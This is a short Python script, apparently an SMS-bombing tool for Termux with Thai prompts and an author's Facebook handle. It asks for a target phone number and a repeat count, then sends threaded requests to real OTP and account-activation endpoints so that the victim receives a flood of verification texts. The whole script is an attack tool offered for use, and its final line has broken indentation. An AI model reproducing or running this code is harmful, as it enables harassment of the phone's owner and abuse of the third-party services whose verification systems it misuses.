import requests
import os
import time
import threading
from threading import Thread
os.system("clear") # ในวงเล็บคืคำสั่งใน Termux
print("")
print("FB:ATITEP SETTHAMAS")
print("")
print("ฝากติดตามด้วย")
phone = input("เบอร์ : ")
num = int(input("จำนวน : "))
print("")

def test(): 
	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})
	print("Sent")
	
def test2():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("Sent")
	
def test3():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("กําลังยิง")
	
def test4():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("กําลังยิง")

def test5():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("กําลังยิง")
	
def test6():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("กําลังยิง")
	
def test7():
	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
	print("กําลังยิง")
	
for i in range(num):
	time.sleep(1)
	threading.Thread(target=test).start()
	threading.Thread(target=test2).start()
	threading.Thread(target=test3).start()
    threading.Thread(target=test4).start()